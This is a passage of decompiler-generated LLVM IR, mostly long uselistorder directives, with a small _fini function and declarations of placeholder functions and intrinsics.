  uselistorder i32 -1, { 0, 45, 282, 188, 189, 48, 49, 46, 47, 190, 50, 1, 191, 192, 193, 194, 2, 195, 196, 3, 4, 197, 88, 198, 89, 332, 170, 334, 90, 335, 152, 297, 336, 337, 5, 91, 338, 339, 199, 200, 149, 201, 158, 92, 6, 202, 348, 77, 78, 349, 203, 153, 204, 155, 205, 7, 206, 157, 156, 350, 351, 67, 68, 69, 70, 72, 79, 8, 9, 75, 283, 10, 11, 12, 94, 98, 93, 95, 146, 147, 99, 97, 96, 171, 284, 100, 342, 101, 298, 207, 299, 300, 285, 286, 287, 102, 288, 289, 352, 353, 208, 51, 52, 301, 209, 85, 53, 210, 302, 54, 13, 55, 211, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 212, 343, 345, 213, 103, 303, 215, 304, 305, 86, 80, 81, 306, 307, 308, 309, 310, 159, 104, 311, 160, 14, 214, 82, 83, 216, 312, 356, 357, 217, 172, 173, 313, 218, 219, 314, 315, 174, 333, 220, 16, 15, 221, 222, 17, 290, 223, 105, 391, 106, 107, 329, 108, 367, 76, 368, 109, 363, 110, 291, 111, 112, 361, 18, 113, 369, 370, 114, 19, 326, 20, 224, 225, 226, 227, 371, 341, 176, 175, 115, 292, 74, 228, 116, 293, 229, 21, 230, 22, 231, 177, 372, 26, 232, 233, 25, 27, 373, 24, 234, 235, 56, 23, 236, 57, 58, 59, 60, 237, 238, 239, 71, 327, 328, 28, 362, 117, 354, 118, 119, 330, 120, 374, 121, 358, 122, 123, 296, 124, 355, 73, 240, 316, 241, 61, 62, 242, 243, 244, 245, 246, 87, 125, 247, 248, 249, 178, 126, 250, 29, 251, 150, 127, 344, 252, 317, 253, 254, 318, 319, 63, 320, 321, 84, 322, 255, 256, 151, 161, 154, 323, 30, 257, 324, 258, 31, 64, 259, 65, 325, 347, 340, 179, 128, 364, 129, 393, 130, 346, 131, 132, 375, 133, 294, 134, 395, 135, 331, 136, 392, 137, 360, 138, 295, 139, 359, 140, 141, 142, 365, 143, 394, 144, 366, 260, 261, 145, 180, 262, 263, 264, 265, 36, 37, 38, 32, 33, 34, 35, 181, 182, 266, 267, 268, 39, 269, 270, 66, 40, 41, 148, 183, 184, 185, 42, 271, 272, 273, 167, 168, 169, 43, 274, 162, 163, 164, 165, 166, 44, 275, 276, 277, 278, 279, 280, 281, 186, 187 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 24, 5, 6, 25, 7, 8, 9, 10, 26, 30, 11, 14, 35, 15, 31, 18, 32, 16, 13, 27, 17, 19, 20, 28, 29, 21, 33, 22, 34, 12, 23 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 14, 10, 15, 16, 9 }
  uselistorder i32 2097152, { 8, 9, 16, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7, 15 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 186, 37, 38, 39, 167, 40, 41, 42, 43, 44, 208, 209, 210, 212, 213, 214, 93, 215, 45, 125, 216, 217, 218, 46, 126, 219, 220, 221, 122, 127, 224, 0, 227, 168, 169, 94, 128, 228, 129, 182, 47, 183, 229, 230, 231, 48, 187, 188, 189, 170, 211, 232, 233, 234, 235, 49, 50, 95, 96, 97, 251, 252, 113, 253, 254, 98, 255, 256, 225, 190, 92, 191, 192, 51, 52, 193, 194, 130, 131, 201, 132, 202, 133, 203, 134, 204, 135, 205, 136, 53, 181, 54, 99, 55, 56, 111, 184, 90, 57, 257, 112, 242, 58, 59, 243, 60, 61, 91, 222, 62, 63, 64, 223, 65, 66, 67, 68, 114, 244, 245, 69, 70, 1, 171, 246, 71, 247, 236, 172, 2, 72, 73, 74, 100, 101, 102, 116, 103, 117, 104, 105, 137, 106, 108, 107, 109, 173, 174, 175, 195, 196, 123, 75, 76, 77, 78, 79, 124, 197, 118, 115, 80, 198, 199, 200, 226, 176, 81, 82, 83, 177, 84, 85, 86, 87, 88, 138, 185, 139, 140, 141, 142, 143, 144, 119, 206, 145, 146, 120, 147, 148, 149, 150, 151, 152, 154, 178, 153, 179, 157, 155, 156, 180, 166, 158, 207, 159, 160, 161, 237, 238, 239, 240, 162, 241, 110, 163, 164, 165, 250, 121, 248, 89, 249 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1e55c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1e55c)
  %v31_1e564 = load i32, i32* @r0, align 4
  ret i32 %v31_1e564

; uselistorder directives
  uselistorder i32* @r0, { 34, 234, 228, 229, 230, 231, 232, 233, 35, 32, 235, 95, 236, 5, 96, 237, 238, 94, 97, 239, 36, 33, 240, 241, 242, 243, 141, 37, 142, 143, 38, 39, 244, 245, 246, 247, 248, 249, 26, 250, 251, 40, 6, 304, 306, 120, 305, 2, 317, 316, 49, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 330, 331, 332, 344, 345, 346, 347, 348, 349, 350, 351, 123, 352, 144, 353, 354, 355, 357, 356, 14, 336, 252, 253, 145, 146, 41, 42, 43, 358, 359, 360, 361, 362, 44, 15, 46, 395, 16, 47, 17, 18, 308, 3, 309, 294, 295, 296, 7, 339, 50, 254, 255, 91, 92, 256, 257, 258, 93, 259, 260, 261, 51, 262, 263, 264, 265, 52, 71, 307, 310, 311, 312, 313, 314, 315, 53, 54, 147, 148, 149, 55, 56, 57, 58, 381, 60, 396, 382, 119, 398, 399, 131, 132, 133, 134, 135, 136, 137, 138, 61, 62, 63, 139, 140, 397, 329, 64, 300, 301, 302, 303, 150, 151, 384, 74, 129, 130, 385, 8, 386, 387, 388, 333, 121, 334, 335, 122, 75, 389, 390, 391, 392, 393, 376, 291, 65, 363, 45, 371, 72, 266, 267, 268, 66, 19, 67, 48, 338, 68, 269, 270, 271, 9, 10, 272, 273, 11, 13, 0, 1, 274, 275, 12, 276, 277, 278, 70, 115, 279, 280, 281, 282, 283, 69, 284, 20, 285, 286, 4, 287, 337, 152, 153, 154, 155, 156, 340, 341, 342, 343, 288, 289, 157, 59, 369, 73, 158, 383, 159, 98, 160, 161, 162, 99, 163, 100, 101, 102, 103, 164, 165, 166, 167, 104, 105, 168, 169, 170, 171, 172, 106, 107, 108, 31, 25, 109, 173, 174, 175, 176, 177, 30, 24, 110, 178, 179, 180, 181, 182, 183, 184, 185, 111, 186, 187, 188, 189, 190, 29, 191, 192, 193, 23, 112, 194, 28, 22, 113, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 27, 21, 114, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 124, 225, 125, 226, 126, 227, 116, 117, 118, 290, 292, 293, 297, 298, 299, 364, 365, 366, 367, 368, 370, 372, 373, 374, 375, 377, 378, 379, 380, 127, 128, 394, 83, 84, 85, 86, 87, 88, 89, 90, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder void (i32)* @__pseudo_branch, { 15, 81, 82, 83, 33, 34, 44, 45, 46, 95, 41, 42, 43, 35, 16, 17, 18, 19, 20, 21, 100, 101, 102, 103, 104, 96, 87, 97, 98, 99, 0, 38, 39, 40, 22, 23, 24, 25, 26, 27, 84, 85, 86, 105, 106, 107, 88, 89, 90, 55, 56, 57, 91, 92, 93, 108, 64, 65, 66, 67, 68, 69, 70, 71, 72, 58, 59, 60, 61, 62, 63, 29, 30, 73, 74, 31, 32, 36, 37, 28, 75, 76, 77, 78, 79, 80, 47, 48, 49, 50, 51, 52, 53, 54, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 94 }
  uselistorder i32 0, { 0, 1146, 1, 1147, 1148, 948, 442, 443, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 3, 4, 5, 1156, 1157, 2, 1158, 1159, 949, 6, 1160, 1161, 34, 950, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 106, 105, 216, 217, 218, 1170, 1171, 1172, 7, 1173, 1174, 35, 1175, 1176, 1177, 36, 37, 209, 1178, 1179, 1180, 1181, 38, 210, 454, 1182, 1183, 1184, 1185, 1186, 1187, 39, 1188, 9, 8, 40, 951, 1189, 953, 952, 1190, 1191, 1192, 1193, 1194, 10, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 954, 1019, 1195, 1196, 1197, 1198, 1199, 11, 1200, 955, 1201, 1202, 1203, 1204, 211, 212, 455, 1205, 1206, 13, 12, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 956, 957, 1214, 959, 1215, 1216, 960, 961, 1217, 1218, 958, 1219, 962, 1220, 963, 1221, 1222, 1223, 1224, 14, 1449, 1450, 1451, 1452, 136, 1453, 219, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 220, 964, 967, 965, 966, 1461, 1462, 1463, 1464, 1465, 1466, 1473, 1474, 54, 55, 1483, 1484, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1485, 1486, 1493, 1488, 1489, 1491, 1490, 1492, 113, 221, 1516, 1523, 222, 1524, 127, 1525, 128, 1526, 129, 1527, 130, 1528, 223, 1529, 1530, 1225, 1226, 1534, 1535, 224, 1536, 1537, 1538, 225, 1539, 1540, 86, 89, 90, 114, 1541, 87, 1542, 88, 1543, 1544, 1545, 147, 148, 1546, 1547, 1548, 226, 1549, 1550, 390, 1551, 1552, 456, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 91, 1560, 1561, 115, 1576, 1577, 1578, 1579, 1580, 1581, 333, 1582, 1583, 1584, 1594, 1585, 1629, 1649, 1650, 1651, 1593, 149, 1652, 396, 386, 387, 457, 1653, 1654, 1655, 1657, 1658, 1659, 1660, 41, 1661, 1662, 56, 1663, 1664, 1665, 1666, 1669, 1670, 1671, 1672, 1673, 1674, 227, 1675, 1676, 968, 1677, 1667, 1656, 969, 330, 970, 1668, 1678, 1679, 1680, 1681, 57, 1683, 58, 1682, 150, 1684, 1685, 228, 1020, 1021, 1022, 1023, 1024, 116, 1025, 1026, 229, 42, 230, 1027, 458, 1028, 388, 231, 232, 459, 460, 234, 1686, 1687, 1688, 1689, 1690, 235, 233, 461, 462, 1691, 1692, 1693, 1694, 236, 463, 1695, 464, 1696, 59, 60, 61, 62, 444, 237, 1697, 131, 1698, 239, 238, 465, 466, 137, 1595, 1596, 1597, 1598, 1599, 1227, 1228, 1229, 1230, 1231, 1232, 240, 107, 389, 1233, 1234, 1235, 92, 1600, 467, 1601, 1602, 1603, 151, 1236, 468, 1237, 1238, 1239, 1240, 1241, 1242, 397, 398, 1031, 1032, 1531, 1532, 399, 1533, 469, 1029, 470, 1030, 1038, 1039, 15, 152, 153, 244, 248, 249, 250, 246, 241, 245, 243, 247, 242, 1517, 1518, 1519, 1520, 471, 1699, 1700, 1701, 251, 1702, 1706, 1707, 1708, 1709, 1710, 252, 1711, 154, 1760, 1761, 1762, 1763, 253, 254, 1764, 1494, 1495, 1496, 334, 1861, 93, 335, 1865, 1866, 123, 63, 155, 971, 1243, 64, 156, 1244, 1245, 336, 1420, 1421, 337, 65, 1497, 117, 255, 1422, 1423, 157, 972, 339, 1246, 66, 124, 1247, 1248, 338, 1867, 1868, 1869, 1870, 1871, 1874, 1875, 1876, 1877, 1878, 1879, 1880, 1881, 1882, 1883, 1872, 1873, 1884, 1885, 1886, 1887, 1888, 1889, 1890, 1891, 43, 1892, 1893, 1894, 1895, 1896, 44, 1897, 1898, 1899, 45, 1900, 1901, 1902, 46, 1903, 1904, 1905, 1906, 1907, 1908, 1909, 1910, 1911, 1912, 1913, 1914, 1915, 1916, 1917, 1918, 1919, 1920, 1921, 1922, 1923, 1924, 1925, 1926, 1929, 1930, 1931, 1932, 1933, 1934, 1935, 1927, 1928, 1936, 1937, 1938, 1939, 1940, 1941, 1942, 1943, 1944, 1945, 47, 1946, 1947, 1948, 1949, 1950, 48, 1951, 1952, 1953, 1954, 1955, 49, 1956, 1957, 1958, 1959, 1960, 1961, 1962, 1963, 1964, 1965, 1966, 1967, 1968, 1969, 1970, 1604, 1605, 1621, 472, 473, 1622, 1623, 1498, 1249, 1250, 1251, 1252, 1253, 257, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 159, 158, 258, 259, 1266, 1267, 1268, 1269, 1270, 1271, 160, 161, 1272, 1273, 1274, 1275, 1276, 1277, 50, 1278, 1279, 1280, 1281, 1282, 67, 260, 1283, 162, 475, 1284, 1285, 1286, 1287, 1288, 476, 261, 1289, 1290, 1291, 1292, 405, 1293, 1294, 1295, 404, 1296, 1297, 403, 1298, 1299, 256, 1300, 474, 1301, 263, 1302, 51, 1303, 400, 391, 1304, 1305, 1306, 477, 478, 1307, 1308, 1309, 401, 402, 1310, 1311, 1312, 262, 1313, 1314, 1315, 1316, 1317, 1318, 1737, 16, 1738, 1739, 1740, 973, 1741, 1742, 1743, 1744, 1745, 1746, 1320, 1319, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 163, 1606, 1607, 1608, 17, 1609, 340, 1336, 1335, 341, 1337, 1338, 164, 1339, 264, 266, 1521, 265, 1522, 267, 1487, 165, 1499, 1504, 1505, 1500, 1501, 1502, 1507, 1508, 1509, 268, 1510, 1511, 1512, 1513, 1514, 1503, 1506, 1515, 166, 1033, 1034, 1035, 269, 1036, 1037, 270, 1040, 1044, 1045, 1046, 1047, 271, 1041, 272, 1042, 1043, 167, 1048, 1971, 1586, 1438, 1789, 1790, 1791, 1792, 273, 1793, 1776, 1049, 1777, 1773, 168, 274, 1972, 1973, 1778, 1794, 1795, 275, 1412, 1413, 479, 1416, 169, 480, 1978, 1979, 481, 1980, 1981, 276, 343, 1982, 1983, 482, 94, 1984, 1985, 483, 1993, 1997, 974, 342, 1998, 484, 2001, 1994, 1995, 1996, 1974, 1975, 975, 277, 331, 998, 18, 19, 485, 1779, 278, 999, 1001, 1000, 279, 1002, 1003, 1004, 486, 1005, 142, 1417, 132, 1418, 281, 280, 1419, 170, 282, 1976, 1977, 1566, 1567, 1568, 1569, 1570, 1571, 284, 171, 1572, 1573, 1574, 133, 283, 1575, 487, 1050, 172, 1051, 173, 1052, 285, 1467, 1468, 1469, 20, 1716, 1053, 1054, 134, 1055, 174, 488, 489, 1988, 406, 175, 176, 1801, 1802, 1803, 1804, 1805, 286, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 287, 1796, 490, 1797, 1798, 491, 1799, 1800, 177, 1587, 492, 288, 1588, 1589, 1590, 1591, 1592, 178, 1813, 1814, 292, 290, 291, 1815, 1816, 298, 297, 214, 289, 1817, 1818, 1819, 1820, 1821, 1822, 393, 392, 407, 493, 1823, 1824, 1825, 95, 1826, 294, 293, 295, 296, 213, 1827, 1828, 344, 1829, 1830, 143, 1831, 1832, 1833, 1834, 1835, 21, 22, 1414, 1415, 96, 179, 23, 408, 494, 1712, 1713, 1439, 1836, 1749, 1726, 1095, 1727, 1765, 1748, 299, 1747, 300, 1630, 301, 68, 302, 1340, 1341, 304, 1342, 1343, 303, 1344, 305, 180, 1862, 1863, 1864, 345, 1703, 1704, 1705, 306, 1345, 1346, 346, 1347, 144, 1755, 1756, 1757, 495, 24, 1999, 2000, 118, 307, 1348, 1349, 1350, 1351, 1352, 308, 1624, 976, 1625, 1626, 181, 182, 183, 1610, 1611, 1619, 1616, 1617, 1618, 347, 385, 1620, 184, 1614, 1612, 1613, 348, 1615, 185, 1064, 1065, 186, 25, 187, 1627, 1628, 26, 27, 188, 28, 1066, 189, 29, 1353, 1354, 1355, 1356, 1357, 190, 1358, 1359, 1360, 1361, 1363, 1364, 1362, 1365, 191, 1366, 1369, 1367, 1368, 309, 496, 1370, 1371, 1372, 310, 311, 1373, 1374, 1375, 1376, 1377, 1378, 497, 1379, 1380, 498, 1381, 1383, 312, 1382, 349, 332, 1384, 1385, 1387, 192, 1388, 314, 1389, 100, 101, 98, 99, 1390, 499, 138, 135, 1391, 1392, 1393, 317, 315, 316, 500, 1394, 1395, 1396, 97, 313, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 501, 139, 375, 108, 1406, 1407, 1408, 30, 318, 1006, 1007, 145, 102, 125, 1386, 350, 193, 1057, 1056, 352, 1059, 1058, 351, 1060, 1061, 502, 1062, 194, 1632, 1633, 1634, 103, 104, 1635, 1636, 1637, 319, 1638, 1639, 1640, 1641, 1642, 503, 1643, 1644, 1645, 1646, 1647, 1409, 1648, 195, 1562, 1563, 1564, 1565, 196, 31, 1780, 1989, 1986, 1631, 1067, 1837, 1063, 1992, 1470, 1987, 1781, 1771, 1068, 1750, 1724, 1069, 504, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1782, 1990, 140, 1991, 1783, 32, 1838, 1839, 1840, 141, 1841, 1842, 1843, 1844, 1845, 320, 1846, 977, 980, 978, 979, 1847, 981, 394, 511, 512, 353, 513, 1081, 510, 52, 53, 514, 1082, 1083, 515, 525, 526, 632, 633, 69, 409, 505, 215, 507, 508, 410, 509, 1084, 1085, 354, 197, 517, 518, 516, 1086, 1087, 1088, 1089, 1091, 376, 1090, 1092, 1093, 521, 522, 519, 520, 1094, 506, 523, 524, 321, 411, 355, 1097, 527, 1096, 531, 532, 528, 529, 530, 1098, 533, 1099, 445, 1100, 534, 1101, 535, 70, 126, 198, 199, 200, 201, 551, 1102, 412, 413, 536, 414, 1103, 1104, 548, 322, 1105, 1107, 549, 550, 323, 1106, 360, 1108, 552, 1109, 545, 324, 1110, 1112, 546, 547, 325, 1111, 359, 1113, 553, 1114, 554, 1115, 555, 1116, 542, 1117, 1119, 543, 544, 1118, 358, 1120, 1121, 539, 1122, 1124, 540, 541, 1123, 357, 1125, 538, 556, 1126, 1127, 557, 1128, 1130, 558, 559, 1129, 356, 1131, 537, 560, 1132, 1133, 561, 1134, 1135, 562, 1136, 1137, 1138, 563, 1139, 1140, 1141, 1142, 1143, 564, 326, 565, 1144, 1145, 119, 109, 327, 1410, 1411, 71, 110, 361, 1424, 568, 72, 415, 1425, 1431, 567, 1426, 1427, 1428, 1429, 1430, 362, 1432, 569, 446, 1433, 1434, 566, 1435, 570, 1436, 1437, 202, 572, 379, 73, 377, 378, 1440, 146, 447, 1441, 573, 1442, 571, 1443, 574, 382, 74, 380, 381, 1444, 575, 1445, 1446, 576, 1447, 1448, 416, 578, 579, 577, 580, 982, 983, 592, 984, 985, 986, 987, 591, 988, 989, 990, 991, 590, 992, 993, 994, 995, 587, 588, 581, 589, 586, 363, 996, 583, 997, 584, 585, 947, 1471, 75, 121, 1472, 417, 582, 76, 111, 120, 593, 594, 595, 418, 419, 420, 1714, 448, 1715, 122, 364, 328, 77, 78, 329, 1717, 421, 422, 423, 424, 602, 1718, 1720, 1721, 1722, 597, 1723, 598, 599, 600, 596, 365, 601, 1719, 449, 604, 605, 603, 425, 33, 607, 606, 608, 1725, 426, 427, 428, 429, 1728, 611, 609, 610, 366, 1729, 612, 1730, 450, 383, 1734, 1735, 430, 1731, 1732, 613, 614, 615, 1733, 617, 618, 619, 620, 621, 616, 367, 622, 1736, 623, 79, 629, 80, 628, 624, 1751, 627, 369, 630, 625, 1752, 626, 368, 631, 81, 112, 1753, 431, 634, 635, 1754, 636, 1759, 637, 1758, 639, 640, 638, 1766, 1767, 451, 1768, 1769, 203, 1770, 82, 452, 1772, 370, 641, 642, 643, 644, 1774, 1775, 395, 645, 1784, 1785, 646, 1786, 647, 1787, 1788, 648, 204, 649, 650, 651, 652, 653, 1858, 205, 83, 384, 371, 434, 435, 1848, 1849, 1850, 372, 432, 433, 436, 1851, 1852, 437, 1853, 1854, 374, 84, 206, 207, 373, 1856, 1857, 453, 208, 85, 654, 1855, 1859, 1860, 438, 439, 1008, 440, 441, 655, 656, 657, 658, 665, 666, 667, 668, 669, 670, 659, 660, 661, 662, 663, 664, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 2002, 2003, 2004, 2005, 2006, 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 }
  uselistorder i32* @r4, {}
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
